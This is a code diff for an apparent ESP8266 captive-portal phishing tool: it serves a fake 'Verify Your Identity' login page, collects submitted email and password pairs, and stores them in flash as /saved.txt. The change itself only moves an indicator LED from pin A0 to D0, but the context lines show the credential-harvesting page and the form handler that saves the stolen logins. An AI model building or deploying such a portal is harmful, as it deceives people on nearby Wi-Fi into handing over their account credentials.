@@ -10,7 +10,7 @@ DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 int c_count;
 String fdata="";
-#define INBUILT_LED A0
+#define INBUILT_LED D0
 String responseHTML = ""
                       "<!DOCTYPE html><html><head><meta charset='UTF-8'/><meta name='viewport' content='width=device-width, initial-scale=0.9' /><title>Verify Your Identity</title></head>"
                       "<body style='font-family: Calibri; text-align: center;padding:20px;'>"
@@ -56,13 +56,13 @@ void handleForm() {
    {
    Serial.println("Data Saved to flash");
    fdata = fdata+"<br>"+email+":"+pass;
-    digitalWrite(A0,LOW);
+    digitalWrite(D0,LOW);
     delay(200);
-    digitalWrite(A0,HIGH);
+    digitalWrite(D0,HIGH);
     delay(200);
-    digitalWrite(A0,LOW);
+    digitalWrite(D0,LOW);
     delay(200);
-    digitalWrite(A0,HIGH);
+    digitalWrite(D0,HIGH);
    }
   else{Serial.println("Saving to Flash Failed");}
   if(random(1,2)==1)
@@ -143,12 +143,12 @@ void setup() {
   webServer.begin();
   pinMode(INBUILT_LED,OUTPUT);
   digitalWrite(INBUILT_LED,HIGH);
-  pinMode(A0,OUTPUT);
-  digitalWrite(A0,HIGH);
+  pinMode(D0,OUTPUT);
+  digitalWrite(D0,HIGH);
   c_count=0;
-  digitalWrite(A0,LOW);
+  digitalWrite(D0,LOW);
   delay(1000);
-  digitalWrite(A0,HIGH);
+  digitalWrite(D0,HIGH);
 
   Serial.println("following data is avalable in Flash");
   fdata = load_from_file("/saved.txt");
